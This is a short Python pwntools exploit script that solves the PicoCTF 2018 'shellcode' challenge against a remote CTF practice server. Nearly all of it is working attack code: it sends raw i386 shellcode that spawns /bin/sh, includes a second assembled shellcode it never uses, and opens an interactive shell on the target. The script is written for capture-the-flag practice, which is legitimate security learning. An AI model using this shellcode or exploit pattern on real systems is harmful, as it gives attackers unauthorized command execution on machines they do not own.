#+++++++++++++++++++exp.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Mon Nov 16 14:51:28 CST 2020
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

#context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

elf = ELF('./PicoCTF_2018_shellcode')
#libc = ELF('null')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./PicoCTF_2018_shellcode')
sh = remote('node3.buuoj.cn',26035)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

myshell = asm('''
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80
	''')

#gdb.attach(sh)
sh.sendline(shellcode)

sh.interactive()
